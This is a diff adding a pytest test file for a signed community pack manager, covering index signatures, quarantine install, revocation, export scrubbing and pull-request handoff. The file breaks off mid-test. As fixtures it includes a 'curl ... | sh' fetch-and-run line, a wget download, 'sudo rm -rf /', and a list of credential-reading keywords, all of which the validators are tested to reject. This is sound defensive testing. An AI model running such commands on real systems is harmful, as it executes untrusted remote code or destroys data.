@@ -1,0 +1,771 @@
+"""Community zoo: signed index, quarantine install, trust levels and revocation, export, pull request handoff,
+CLI and hub (offline: downloads go to a fake session, keys are made at runtime)."""
+
+import base64
+import inspect
+import json
+import subprocess
+import zipfile
+from datetime import date
+from pathlib import Path
+from types import SimpleNamespace
+
+import pytest
+from click.testing import CliRunner
+from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
+
+from orchestrator.Core import community_manager as zoo_mod
+from orchestrator.Core import community_pack as cp
+from orchestrator.Core.community_manager import CommunityManager, TrustLevel, build_trust_check, submit_contribution
+from orchestrator.Core.community_pack import PROVENANCE_NAME, PackError, build_manifest, sign_manifest, write_pack
+
+INDEX_URL = "https://zoo.invalid/index.json"
+REPO = "lcf-example/community"
+TARGET_YML = """metadata:
+  name: Demo Board
+  version: 1.2.0
+capabilities:
+  schema_version: 1
+  support_level: community
+  boards:
+    demo: {label: Demo}
+  formats:
+    gguf: {label: GGUF, quantizations: [Q4_K_M, Q8_0], default_quantization: Q4_K_M}
+"""
+
+
+# --- helpers ------------------------------------------------------------------------------------------------
+
+class FakeResponse:
+    def __init__(self, status, data=b"", url=""):
+        self.status_code, self.data, self.url = status, data, url
+        self.headers = {"Content-Length": str(len(data))} if status == 200 else {}
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+    def iter_content(self, chunk_size=1):
+        for i in range(0, len(self.data), chunk_size):
+            yield self.data[i:i + chunk_size]
+
+
+class FakeSession:
+    def __init__(self):
+        self.files, self.calls, self.redirects = {}, [], {}
+
+    def get(self, url, headers=None, stream=False, timeout=None, allow_redirects=True):
+        self.calls.append(url)
+        if url not in self.files:
+            return FakeResponse(404, url=url)
+        return FakeResponse(200, self.files[url], self.redirects.get(url, url))
+
+
+class FakeSecrets:
+    def __init__(self):
+        self.store = {}
+
+    def get_secret(self, name):
+        return self.store.get(name)
+
+    def set_secret(self, name, value):
+        self.store[name] = value
+        return True
+
+    def list_secrets(self):
+        return list(self.store)
+
+
+def trusted(key, valid_until="2099-12-31"):
+    raw = cp._raw_public(key.public_key())
+    return cp.TrustedKey(key_id=cp.key_id(key.public_key()), pubkey_b64=base64.b64encode(raw).decode(),
+                         valid_until=valid_until)
+
+
+def make_target(root: Path, script: str = "echo build\n", yml: str = TARGET_YML) -> Path:
+    (root / "modules").mkdir(parents=True)
+    (root / "target.yml").write_text(yml, encoding="utf-8")
+    (root / "Dockerfile").write_text("FROM debian:bookworm-slim\nRUN echo ok\n", encoding="utf-8")
+    (root / "modules" / "build.sh").write_text("#!/bin/bash\n" + script, encoding="utf-8")
+    return root
+
+
+def pack_bytes(root: Path, kind="target", pack_id="demo-board", version="1.2.0", author="alice", key=None) -> bytes:
+    manifest = build_manifest(root, kind=kind, id=pack_id, version=version, author=author, license="MIT")
+    return write_pack(root, manifest, sign_manifest(manifest, key) if key else None)
+
+
+class World:
+    """An installation folder, a fake network with a signed index, and a community manager."""
+
+    def __init__(self, tmp_path: Path):
+        self.tmp = tmp_path
+        self.root = tmp_path / "install"
+        (self.root / "targets").mkdir(parents=True)
+        self.maintainer = Ed25519PrivateKey.generate()
+        self.session = FakeSession()
+        self.secrets = FakeSecrets()
+        self.values = {"community_index_url": INDEX_URL, "community_repo": REPO, "targets_dir": "targets"}
+        self.config = SimpleNamespace(get=lambda k, d=None: self.values.get(k, d), user_state_dir=tmp_path / "state")
+        self.rag = SimpleNamespace(records=[], ingested=[])
+        self.rag.export_records = lambda: iter(self.rag.records)
+        self.rag.ingest_document = lambda s, c, m: self.rag.ingested.append((s, c)) or True
+        self.framework = SimpleNamespace(info=SimpleNamespace(installation_path=self.root), config=self.config,
+                                         resolve_path=lambda v: self.root / v, secrets_manager=self.secrets,
+                                         get_component=lambda n: self.rag if n == "rag_manager" else None)
+        self.cm = CommunityManager(self.framework, session=self.session, keys=[trusted(self.maintainer)])
+        self.entries, self.revoked, self.version = [], [], 1
+
+    def add(self, data: bytes, kind="target", pack_id="demo-board", version="1.2.0", trust="community"):
+        url = f"https://zoo.invalid/{kind}/{pack_id}-{version}.zip"
+        self.session.files[url] = data
+        self.entries.append({"kind": kind, "id": pack_id, "version": version, "author": "alice", "license": "MIT",
+                             "trust": trust, "url": url, "size": len(data),
+                             "sha256": cp.hashlib.sha256(data).hexdigest(), "title": pack_id.title()})
+        return url
+
+    def publish(self, key=None, version=None):
+        self.version = version or self.version
+        data = json.dumps({"schema_version": 1, "version": self.version, "generated": "2026-10-11T12:00:00Z",
+                           "entries": self.entries, "revoked": self.revoked}).encode()
+        self.session.files[INDEX_URL] = data
+        self.session.files[INDEX_URL + ".sig"] = cp.sign_index(data, key or self.maintainer).model_dump_json().encode()
+        return data
+
+    def target_pack(self, name="demo-board", **kw) -> bytes:
+        return pack_bytes(make_target(self.tmp / "src" / name, **{k: v for k, v in kw.items()
+                                                                  if k in ("script", "yml")}),
+                          pack_id=name, **{k: v for k, v in kw.items() if k in ("author", "key", "version")})
+
+    def install(self, kind="target", pack_id="demo-board", **kw):
+        return self.cm.finish_install(self.cm.prepare_install(kind, pack_id, **kw))
+
+
+@pytest.fixture
+def world(tmp_path):
+    return World(tmp_path)
+
+
+# --- index ----------------------------------------------------------------------------------------------------
+
+class TestIndex:
+
+    def test_signed_index_is_fetched_cached_and_listed(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        state = world.cm.load_index(refresh=True)
+        assert state.source == "fetched" and state.index.version == 1
+        assert (world.cm.cache_dir / "index.json.sig").is_file()
+        items = world.cm.list_items(state.index)
+        assert [(i.id, i.trust, i.installed_version) for i in items] == [("demo-board", TrustLevel.COMMUNITY, None)]
+        world.session.files.clear()
+        assert world.cm.load_index().source == "cached", "no network needed once cached"
+
+    @pytest.mark.parametrize("tamper", ["index", "signature", "key"])
+    def test_bad_signature_means_no_index_and_the_cache_stays(self, world, tamper):
+        world.publish()
+        world.cm.load_index(refresh=True)
+        cached = (world.cm.cache_dir / "index.json").read_bytes()
+        world.entries.append({"kind": "target", "id": "evil", "version": "1.0.0", "author": "x", "license": "MIT",
+                              "url": "https://evil.invalid/x.zip", "size": 1, "sha256": "0" * 64})
+        world.publish(version=2, key=Ed25519PrivateKey.generate() if tamper == "key" else None)
+        if tamper == "index":
+            world.session.files[INDEX_URL] = world.session.files[INDEX_URL].replace(b'"version": 2', b'"version": 3')
+        elif tamper == "signature":
+            sig = json.loads(world.session.files[INDEX_URL + ".sig"])
+            sig["sig"] = sig["sig"][:-2] + ("AA" if sig["sig"][-2:] != "AA" else "BB")
+            world.session.files[INDEX_URL + ".sig"] = json.dumps(sig).encode()
+        with pytest.raises(PackError, match="does not match|not one of the trusted keys|not a valid"):
+            world.cm.load_index(refresh=True)
+        assert (world.cm.cache_dir / "index.json").read_bytes() == cached
+
+    def test_expired_key_is_refused(self, world):
+        world.cm = CommunityManager(world.framework, session=world.session,
+                                    keys=[trusted(world.maintainer, valid_until="2020-01-01")])
+        world.publish()
+        with pytest.raises(PackError, match="expired"):
+            world.cm.load_index(refresh=True)
+
+    def test_older_index_is_refused_as_rollback(self, world):
+        world.publish(version=5)
+        world.cm.load_index(refresh=True)
+        world.publish(version=4)
+        with pytest.raises(PackError, match="older"):
+            world.cm.load_index(refresh=True)
+        assert world.cm.cached_index().version == 5
+
+    def test_offline_uses_the_cache(self, world):
+        world.publish(version=3)
+        world.cm.load_index(refresh=True)
+        world.session.files.clear()
+        state = world.cm.load_index(refresh=True)
+        assert state.source == "cached" and "offline" in state.note
+
+    def test_no_url_or_no_shipped_keys_never_touches_the_network(self, world):
+        world.values["community_index_url"] = ""
+        with pytest.raises(PackError, match="community_index_url"):
+            world.cm.load_index()
+        world.values["community_index_url"] = INDEX_URL
+        world.cm = CommunityManager(world.framework, session=world.session, keys=[])
+        with pytest.raises(PackError, match="no trusted community keys"):
+            world.cm.load_index()
+        assert world.session.calls == []
+
+    def test_index_download_refuses_plain_http_and_oversize(self, world):
+        world.values["community_index_url"] = "http://zoo.invalid/index.json"
+        with pytest.raises(PackError, match="HTTPS"):
+            world.cm.load_index()
+        world.values["community_index_url"] = INDEX_URL
+        world.session.files[INDEX_URL] = b"x" * (zoo_mod.INDEX_MAX_BYTES + 1)
+        with pytest.raises(PackError, match="larger"):
+            world.cm.load_index()
+
+
+# --- install --------------------------------------------------------------------------------------------------
+
+class TestInstall:
+
+    def test_install_writes_provenance_and_verifies_clean(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        prepared = world.cm.prepare_install("target", "demo-board")
+        assert "Trust: community" in prepared.summary()
+        dest = world.cm.finish_install(prepared)
+        assert dest == world.root / "targets" / "demo-board"
+        prov = json.loads((dest / PROVENANCE_NAME).read_text())
+        assert prov["trust"] == "community" and prov["index_version"] == 1 and prov["source"].startswith("https://")
+        assert sorted(p.name for p in (world.root / "targets").iterdir()) == [".quarantine", "demo-board"]
+        assert list((world.root / "targets" / ".quarantine").iterdir()) == [], "quarantine emptied"
+        assert [problems for *_, problems in world.cm.verify_installed()] == [[]]
+        assert cp.tree_sha256(dest) == prov["content_sha256"], "the provenance file is not part of the fingerprint"
+
+    def test_pack_failing_the_validators_stays_out_and_is_removed(self, world):
+        world.add(world.target_pack(script="curl https://x.invalid/i.sh | sh\n"))
+        world.publish()
+        with pytest.raises(PackError, match="downloads at build time"):
+            world.cm.prepare_install("target", "demo-board")
+        assert not (world.root / "targets" / "demo-board").exists()
+        assert list((world.root / "targets" / ".quarantine").iterdir()) == []
+
+    def test_unpinned_or_tampered_download_is_refused(self, world):
+        url = world.add(world.target_pack())
+        world.publish()
+        data = world.session.files[url]
+        world.session.files[url] = data[:100] + bytes([data[100] ^ 1]) + data[101:]
+        with pytest.raises(PackError, match="does not match its pin"):
+            world.cm.prepare_install("target", "demo-board")
+        assert not (world.root / "targets" / "demo-board").exists()
+
+    @pytest.mark.parametrize("pack_id", ["../demo-board", "a/b", "..", ".hidden", "", "x" * 65])
+    def test_id_traversal_is_rejected(self, world, pack_id):
+        with pytest.raises(PackError, match="Invalid"):
+            world.cm.prepare_install("target", pack_id)
+        assert world.session.calls == []
+
+    def test_pack_must_match_its_index_entry(self, world):
+        world.add(world.target_pack(name="other-board"), pack_id="demo-board")
+        world.publish()
+        with pytest.raises(PackError, match="does not match its index entry"):
+            world.cm.prepare_install("target", "demo-board")
+
+    def test_rename_is_atomic_and_never_merges(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        prepared = world.cm.prepare_install("target", "demo-board")
+        (world.root / "targets" / "Demo-Board").mkdir()  # appeared meanwhile (other case)
+        with pytest.raises(PackError, match="already exists"):
+            world.cm.finish_install(prepared)
+        assert list((world.root / "targets" / "Demo-Board").iterdir()) == []
+        assert not prepared.quarantine.exists()
+
+    def test_discard_removes_the_quarantine(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        prepared = world.cm.prepare_install("target", "demo-board")
+        world.cm.discard(prepared)
+        assert not prepared.quarantine.exists() and not (world.root / "targets" / "demo-board").exists()
+
+    def test_changed_files_are_reported_by_verify(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        dest = world.install()
+        (dest / "modules" / "build.sh").write_text("#!/bin/bash\necho changed\n")
+        assert world.cm.verify_installed()[0][3] == ["changed since it was installed"]
+
+    def test_file_import_is_local_unless_the_index_lists_it(self, world, tmp_path):
+        data = world.target_pack()
+        (tmp_path / "pack.zip").write_bytes(data)
+        prepared = world.cm.prepare_install_file(tmp_path / "pack.zip")
+        assert prepared.trust == TrustLevel.LOCAL and "WARNING" in prepared.summary()
+        world.cm.discard(prepared)
+        world.add(data, trust="verified")
+        world.publish()
+        world.cm.load_index(refresh=True)
+        assert world.cm.prepare_install_file(tmp_path / "pack.zip").trust == TrustLevel.VERIFIED
+
+    def test_author_signature_is_checked_and_pinned_per_author(self, world, tmp_path):
+        alice = Ed25519PrivateKey.generate()
+        (tmp_path / "a.zip").write_bytes(world.target_pack(key=alice))
+        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "a.zip"))
+        assert json.loads((dest / PROVENANCE_NAME).read_text())["signer"] == cp.key_id(alice.public_key())
+        (tmp_path / "b.zip").write_bytes(world.target_pack(name="second", key=Ed25519PrivateKey.generate()))
+        notes = world.cm.prepare_install_file(tmp_path / "b.zip").notes
+        assert any("WARNING" in n and "before" in n for n in notes), notes
+
+    def test_signature_with_a_foreign_public_key_is_refused(self, world, tmp_path):
+        data = world.target_pack(key=Ed25519PrivateKey.generate())
+        with zipfile.ZipFile(__import__("io").BytesIO(data)) as zf:
+            members = {i.filename: zf.read(i) for i in zf.infolist()}
+        sig = json.loads(members["pack.sig"])
+        sig["pubkey"] = base64.b64encode(cp._raw_public(Ed25519PrivateKey.generate().public_key())).decode()
+        members["pack.sig"] = json.dumps(sig).encode()
+        with zipfile.ZipFile(tmp_path / "x.zip", "w") as zf:
+            for name, content in members.items():
+                zf.writestr(name, content)
+        with pytest.raises(PackError, match="another public key"):
+            world.cm.prepare_install_file(tmp_path / "x.zip")
+
+    def test_encrypted_pack_to_my_key(self, world, tmp_path):
+        sender, me = Ed25519PrivateKey.generate(), X25519PrivateKey.generate()
+        blob = cp.encrypt_pack(world.target_pack(), sender=sender, recipients=[me.public_key()])
+        (tmp_path / "x.lcfpack").write_bytes(blob)
+        prepared = world.cm.prepare_install_file(tmp_path / "x.lcfpack", identity=me)
+        assert prepared.trust == TrustLevel.LOCAL and prepared.provenance.sender == cp.key_id(sender.public_key())
+        with pytest.raises(PackError, match="not one of the trusted senders"):
+            world.cm.prepare_install_file(tmp_path / "x.lcfpack", identity=me,
+                                          trusted_senders=[Ed25519PrivateKey.generate().public_key()])
+
+    def test_recipe_is_checked_against_the_installed_target(self, world, tmp_path):
+        from test_recipes import recipe_data
+        world.add(world.target_pack())
+        world.publish()
+        world.install()
+        def recipe_pack(fmt, name):
+            data = recipe_data()
+            data.update(id=name, target={"id": "demo-board", "pack_sha256": "a" * 64}, format=fmt,
+                        board="demo", quantization="Q4_K_M")
+            root = tmp_path / name
+            root.mkdir()
+            (root / "recipe.yml").write_text(json.dumps(data))
+            (tmp_path / f"{name}.zip").write_bytes(pack_bytes(root, kind="recipe", pack_id=name, version="1.0.0"))
+            return tmp_path / f"{name}.zip"
+        prepared = world.cm.prepare_install_file(recipe_pack("gguf", "good-recipe"))
+        assert any("differs from the one the recipe was built with" in n for n in prepared.notes)
+        assert world.cm.finish_install(prepared) == world.root / "community" / "recipes" / "good-recipe"
+        with pytest.raises(PackError, match="not available for this target"):
+            world.cm.prepare_install_file(recipe_pack("rkllm", "bad-recipe"))
+
+    def test_knowledge_pack_is_ingested_without_changing_its_folder(self, world, tmp_path):
+        root = tmp_path / "k"
+        root.mkdir()
+        (root / "knowledge.json").write_text(json.dumps([{"source": "s", "content": "c", "metadata": {}}]))
+        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes", version="1.0.0"))
+        world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "k.zip"))
+        assert world.rag.ingested == [("s", "c")]
+        assert [problems for *_, problems in world.cm.verify_installed()] == [[]]
+        bad = tmp_path / "bad"
+        bad.mkdir()
+        (bad / "knowledge.json").write_text('{"not": "a list"}')
+        (tmp_path / "bad.zip").write_bytes(pack_bytes(bad, kind="knowledge", pack_id="bad", version="1.0.0"))
+        with pytest.raises(PackError, match="expected a list"):
+            world.cm.prepare_install_file(tmp_path / "bad.zip")
+
+
+# --- revocation and trust -------------------------------------------------------------------------------------
+
+class TestRevocation:
+
+    def test_revoked_entry_is_blocked(self, world):
+        world.add(world.target_pack())
+        world.revoked.append({"kind": "target", "id": "demo-board", "reason": "unsafe Dockerfile"})
+        world.publish()
+        with pytest.raises(PackError, match="revoked: unsafe Dockerfile"):
+            world.cm.prepare_install("target", "demo-board")
+        assert world.cm.list_items(world.cm.cached_index())[0].trust == TrustLevel.REVOKED
+
+    def test_installed_copy_is_flagged_by_doctor_hub_and_builds(self, world, monkeypatch):
+        from orchestrator.Core.doctor import Severity, check_community
+        monkeypatch.setattr(zoo_mod, "load_trusted_keys", lambda: [trusted(world.maintainer)])  # the shipped keys
+        url = world.add(world.target_pack())
+        world.publish()
+        dest = world.install()
+        assert build_trust_check(dest, world.cm.cache_dir) is None
+        world.revoked.append({"kind": "target", "id": "x", "sha256": world.entries[0]["sha256"],
+                              "reason": "malware"})
+        world.publish(version=2)
+        world.cm.load_index(refresh=True)
+        assert url  # the revocation names the exact pack by its sha256
+        item = world.cm.list_items(world.cm.cached_index())[0]
+        assert item.trust == TrustLevel.REVOKED and item.revoked == "malware"
+        finding = check_community(SimpleNamespace(community_manager=world.cm))[0]
+        assert finding.severity == Severity.ERROR and "revoked" in finding.message
+        with pytest.raises(PackError, match="revoked"):
+            build_trust_check(dest, world.cm.cache_dir)
+
+    def test_local_target_warns_on_every_build(self, world, tmp_path):
+        (tmp_path / "p.zip").write_bytes(world.target_pack())
+        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "p.zip"))
+        assert "trust: local" in build_trust_check(dest, world.cm.cache_dir)
+        assert build_trust_check(world.tmp, world.cm.cache_dir) is None, "own targets carry no provenance"
+
+    def test_builder_records_the_warning(self, world, tmp_path):
+        from orchestrator.Core.builder import BuildEngine
+        (tmp_path / "p.zip").write_bytes(world.target_pack())
+        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "p.zip"))
+        engine = SimpleNamespace(config=SimpleNamespace(user_state_dir=world.tmp / "state"))
+        warnings = []
+        BuildEngine._record_target(engine, SimpleNamespace(), SimpleNamespace(add_warning=warnings.append), dest)
+        assert any("trust: local" in w for w in warnings)
+
+
+# --- export ---------------------------------------------------------------------------------------------------
+
+class TestExport:
+
+    def test_target_export_is_scrubbed_signed_and_lists_only_manifest_files(self, world, monkeypatch):
+        monkeypatch.setattr("getpass.getuser", lambda: "jenny")
+        folder = make_target(world.root / "targets" / "my-board",
+                             script="# SDK in /home/jenny/sdk, board at 192.168.7.20\necho build\n")
+        (folder / PROVENANCE_NAME).write_text("{}")
+        result = world.cm.export_pack("target", "my-board", author="j-board-fan")
+        assert result.path.name == "contribution-target-my-board-1.2.0.zip"
+        assert [c[0] for c in result.changes] == ["modules/build.sh"] and "192.168.7.20" in result.changes[0][1]
+        with zipfile.ZipFile(result.path) as zf:
+            names = set(zf.namelist())
+            script = zf.read("modules/build.sh").decode()
+        assert names == {"pack.json", "pack.sig", "target.yml", "Dockerfile", "modules/build.sh"}
+        assert "jenny" not in script and "192.168.7.20" not in script
+        contents = cp.read_pack(result.path, world.tmp / "check")
+        assert cp.verify_manifest(contents.manifest, contents.signature, [contents.signature.embedded_key()])
+        assert world.secrets.store, "signed with the user's key from the secrets store"
+        assert CommunityManager(None).verify_file(result.path)[1] == []
+
+    def test_export_refuses_binaries_and_invalid_targets(self, world):
+        folder = make_target(world.root / "targets" / "bin-board")
+        (folder / "tool.bin").write_bytes(b"\x7fELF\0\0")
+        with pytest.raises(PackError, match="binary"):
+            world.cm.export_pack("target", "bin-board", author="a")
+        make_target(world.root / "targets" / "bad-board", script="sudo rm -rf /\n")
+        with pytest.raises(PackError, match="would be rejected"):
+            world.cm.export_pack("target", "bad-board", author="a")
+        assert not list(world.cm.contributions_dir.glob("*.zip"))
+
+    def test_recipe_export_from_a_build(self, world, tmp_path):
+        from test_recipes import build_info
+        make_target(world.root / "targets" / "my-board")
+        info = build_info(target="my-board", board="demo", format="gguf", quantization="Q4_K_M")
+        (tmp_path / "build_info.json").write_text(json.dumps(info))
+        result = world.cm.export_pack("recipe", str(tmp_path / "build_info.json"), author="alice")
+        with zipfile.ZipFile(result.path) as zf:
+            assert set(zf.namelist()) == {"pack.json", "pack.sig", "recipe.yml"}
+        assert any("is your own" in n for n in result.notes)
+
+    def test_knowledge_export_only_holds_the_given_sites(self, world):
+        world.rag.records = [{"source": "a", "content": "from docs", "metadata": {"root_url": "https://docs.invalid"}},
+                             {"source": "b", "content": "private", "metadata": {"root_url": "https://mine.invalid"}}]
+        result = world.cm.export_pack("knowledge", author="a", pack_id="board-docs", root_urls=["https://docs.invalid"])
+        with zipfile.ZipFile(result.path) as zf:
+            assert [e["content"] for e in json.loads(zf.read("knowledge.json"))] == ["from docs"]
+
+    def test_encrypted_export_for_private_sharing(self, world):
+        make_target(world.root / "targets" / "team-board")
+        friend = X25519PrivateKey.generate()
+        result = world.cm.export_pack("target", "team-board", author="a", recipients=[friend.public_key()])
+        assert result.encrypted and result.path.suffix == ".lcfpack"
+        opened = cp.decrypt_pack(result.path.read_bytes(), identity=friend)
+        assert opened.sender_id == result.signer
+
+
+# --- pull request handoff -------------------------------------------------------------------------------------
+
+class TestHandoff:
+
+    def test_without_gh_the_upload_page_opens(self, tmp_path):
+        opened, calls = [], []
+        msg = submit_contribution(tmp_path / "contribution-target-x-1.0.0.zip", REPO, "target",
+                                  runner=lambda *a, **k: calls.append(a), which=lambda name: None,
+                                  opener=opened.append)
+        assert opened == [f"https://github.com/{REPO}/upload/main/contributions/target"] and calls == []
+        assert "contribution-target-x-1.0.0.zip" in msg
+
+    def test_gh_opens_a_pull_request_and_never_handles_a_token(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("GH_TOKEN", "ghp_" + "Q" * 36)
+        monkeypatch.setattr("keyring.get_password", lambda *a: pytest.fail("the keyring was read"))
+        pack = tmp_path / "contribution-target-x-1.0.0.zip"
+        pack.write_bytes(b"zip")
+        calls = []
+
+        def runner(cmd, **kwargs):
+            calls.append(cmd)
+            assert "env" not in kwargs, "the child inherits the environment; nothing is passed or read"
+            if cmd[1:3] == ["repo", "fork"]:
+                (Path(kwargs["cwd"]) / "community").mkdir()
+            out = {"api": "octo-cat\n", "pr": "https://github.com/lcf-example/community/pull/7\n"}.get(cmd[1], "")
+            return subprocess.CompletedProcess(cmd, 0, out, "")
+
+        msg = submit_contribution(pack, REPO, "target", runner=runner, which=lambda name: f"/usr/bin/{name}",
+                                  opener=lambda url: pytest.fail("browser opened"))
+        assert msg.endswith("/pull/7")
+        tools = [(Path(c[0]).name, c[1] if c[1] != "-C" else c[3]) for c in calls]
+        assert tools == [("gh", "auth"), ("gh", "api"), ("gh", "repo"), ("git", "switch"), ("git", "add"),
+                         ("git", "commit"), ("git", "push"), ("gh", "pr")]
+        assert ["--head", "octo-cat:contribution-contribution-target-x-1.0.0"] == calls[-1][5:7]
+        assert not any("ghp_" in arg or "@github.com" in arg for c in calls for arg in c)
+
+    def test_gh_failure_falls_back_to_the_browser(self, tmp_path):
+        opened = []
+
+        def runner(cmd, **kwargs):
+            if cmd[1] == "auth":
+                return subprocess.CompletedProcess(cmd, 0, "", "")
+            raise subprocess.CalledProcessError(1, cmd, stderr="permission denied")
+
+        msg = submit_contribution(tmp_path / "p.zip", REPO, "recipe", runner=runner, which=lambda n: n,
+                                  opener=opened.append)
+        assert opened and "permission denied" in msg
+
+    def test_no_repository_configured(self, tmp_path):
+        with pytest.raises(PackError, match="community_repo"):
+            submit_contribution(tmp_path / "p.zip", "", "target", opener=lambda u: pytest.fail("opened"))
+
+    def test_handoff_code_reads_no_credentials(self):
+        source = inspect.getsource(zoo_mod.submit_contribution) + inspect.getsource(zoo_mod._submit_with_gh)
+        for forbidden in ("environ", "getenv", "get_secret", "keyring", "getpass", "env="):
+            assert forbidden not in source
+
+
+# --- generator and wizard -------------------------------------------------------------------------------------
+
+class TestGenerator:
+
+    @pytest.fixture
+    def generator(self, tmp_path):
+        from orchestrator.Core.module_generator import ModuleGenerator
+        (tmp_path / "targets").mkdir()
+        return ModuleGenerator(tmp_path / "targets")
+
+    def data(self, **kw):
+        values = dict(module_name="My Board", architecture="aarch64",
+                      quantization_logic='    Q4_K_M|"Q8_0") echo quantize ;;', supported_boards=["Board One"])
+        values.update(kw)
+        return values
+
+    def test_target_yml_has_community_capabilities_and_no_placeholders(self, generator):
+        import yaml
+        from orchestrator.schemas.targets import SupportLevel, TargetCapabilities
+        target = generator.generate_module(self.data())
+        text = (target / "target.yml").read_text()
+        assert "[" not in text and "YYYY-MM-DD" not in text
+        meta = yaml.safe_load(text)
+        caps = TargetCapabilities.model_validate(meta["capabilities"])
+        assert caps.support_level == SupportLevel.COMMUNITY and list(caps.boards) == ["board_one"]
+        assert caps.formats["gguf"].quantizations == ["Q4_K_M", "Q8_0"]
+        assert meta["metadata"]["created"] == date.today().isoformat()
+        assert not (target / "knowledge").exists()
+
+    def test_leftover_placeholder_fails_generation(self, generator, tmp_path):
+        import shutil
+        from conftest import REPO_ROOT
+        template = tmp_path / "template"
+        shutil.copytree(REPO_ROOT / "targets" / "_template", template)
+        with open(template / "target.yml", "a", encoding="utf-8") as f:
+            f.write('\nsupport_contact: "[Your e-mail]"\n')
+        generator.template_dir = template
+        with pytest.raises(ValueError, match="placeholder"):
+            generator.generate_module(self.data())
+        assert not (generator.targets_dir / "my_board").exists()
+
+    def test_knowledge_snapshot_is_opt_in_and_target_scoped(self, generator, world):
+        world.rag.records = [{"source": "a", "content": "board doc", "metadata": {"root_url": "https://b.invalid"}},
+                             {"source": "b", "content": "unrelated", "metadata": {"root_url": "https://x.invalid"}}]
+        plain = generator.generate_module(self.data(module_name="Plain"), world.framework)
+        assert not (plain / "knowledge").exists(), "nothing of the knowledge base without a request"
+        scoped = generator.generate_module(self.data(module_name="Scoped"), world.framework,
+                                           knowledge_roots=["https://b.invalid"])
+        snapshot = json.loads((scoped / "knowledge" / "initial_knowledge.json").read_text())
+        assert [e["content"] for e in snapshot] == ["board doc"]
+
+
+def test_wizard_snapshot_and_export_are_off_by_default(qapp, tmp_path):
+    from orchestrator.gui.wizards import ModuleCreationWizard
+    wizard = ModuleCreationWizard(tmp_path / "targets")
+    try:
+        wizard.update_summary()
+        assert not wizard.chk_knowledge.isChecked() and not wizard.chk_knowledge.isEnabled()
+        assert not wizard.chk_export.isChecked()
+        wizard.crawled_roots.add("https://docs.invalid")
+        wizard.update_summary()
+        assert wizard.chk_knowledge.isEnabled() and not wizard.chk_knowledge.isChecked()
+    finally:
+        wizard.close()
+
+
+# --- CLI ------------------------------------------------------------------------------------------------------
+
+def invoke(world, *args, input=None):
+    from orchestrator import cli as cli_module
+
+    framework = SimpleNamespace(get_component=lambda n: world.cm if n == "community_manager" else None,
+                                target_manager=None, secrets_manager=world.secrets, config=world.config)
+
+    class Ctx(cli_module.FrameworkContext):
+        def require_framework(self):
+            self.framework_manager = framework
+            return self
+
+    return CliRunner().invoke(cli_module.cli, ["-q", "zoo", *args], obj=Ctx(), input=input)
+
+
+class TestCli:
+
+    def test_commands(self):
+        from orchestrator.cli import cli
+        assert {"list", "show", "install", "verify", "export", "keys"} <= set(cli.commands["zoo"].commands)
+
+    def test_list_install_and_verify(self, world):
+        world.add(world.target_pack())
+        world.publish()
+        listed = invoke(world, "list", "--json")
+        assert json.loads(listed.stdout)[0]["trust"] == "community"
+        result = invoke(world, "install", "demo-board", "--yes")
+        assert result.exit_code == 0, result.output
+        assert (world.root / "targets" / "demo-board" / PROVENANCE_NAME).is_file()
+        assert invoke(world, "verify").exit_code == 0
+
+    def test_file_import_needs_a_terminal_even_with_yes(self, world, tmp_path):
+        (tmp_path / "p.zip").write_bytes(world.target_pack())
+        result = invoke(world, "install", "--file", str(tmp_path / "p.zip"), "--yes")
+        assert result.exit_code == 1 and "No terminal" in result.output
+        assert not (world.root / "targets" / "demo-board").exists()
+
+    def test_verify_a_pack_file(self, world, tmp_path):
+        (tmp_path / "good.zip").write_bytes(world.target_pack())
+        assert invoke(world, "verify", str(tmp_path / "good.zip")).exit_code == 0
+        (tmp_path / "bad.zip").write_bytes(world.target_pack(name="bad", script="wget https://x.invalid/a\n"))
+        bad = invoke(world, "verify", str(tmp_path / "bad.zip"))
+        assert bad.exit_code == 1 and "downloads" in bad.output
+
+    def test_export_and_keys(self, world):
+        make_target(world.root / "targets" / "cli-board")
+        result = invoke(world, "export", "target", "cli-board", "--author", "pat")
+        assert result.exit_code == 0, result.output
+        assert "Privacy scrub" in result.output and "signed with key" in result.output
+        keys = invoke(world, "keys")
+        assert keys.output.count("ed25519:") == 1 and keys.output.count("x25519:") == 1
+
+
+def test_mcp_and_ditto_have_no_zoo_or_upload_tools(booted_framework):
+    names = {spec.name for spec in booted_framework.tool_registry.list()}
+    assert not any(word in name for name in names for word in ("zoo", "community", "upload", "install"))
+
+
+# --- GUI ------------------------------------------------------------------------------------------------------
+
+def wait(hub, qapp):
+    for _ in range(50):
+        for task in list(hub._tasks):
+            task.wait(5000)
+        qapp.processEvents()
+        if not any(t.isRunning() for t in hub._tasks):
+            qapp.processEvents()
+            return
+
+
+def test_hub_smoke(qapp, world, tmp_path, monkeypatch):
+    from PySide6.QtWidgets import QMessageBox
+    from orchestrator.gui import community_hub
+    from test_recipes import recipe_data
+    monkeypatch.setattr(community_hub.QMessageBox, "warning", lambda *a: pytest.fail(f"error shown: {a}"))
+    monkeypatch.setattr(community_hub.QMessageBox, "exec", lambda self: QMessageBox.Yes)
+    world.add(world.target_pack())
+    world.add(world.target_pack(name="revoked-board"), pack_id="revoked-board")
+    world.revoked.append({"kind": "target", "id": "revoked-board", "reason": "broken"})
+    world.publish()
+    root = tmp_path / "r"
+    root.mkdir()
+    data = recipe_data()
+    data.update(id="demo-recipe", target={"id": "demo-board", "pack_sha256": "a" * 64}, format="gguf",
+                board="demo", quantization="Q8_0")
+    (root / "recipe.yml").write_text(json.dumps(data))
+    (tmp_path / "r.zip").write_bytes(pack_bytes(root, kind="recipe", pack_id="demo-recipe", version="1.0.0"))
+    world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "r.zip"))
+
+    built = []
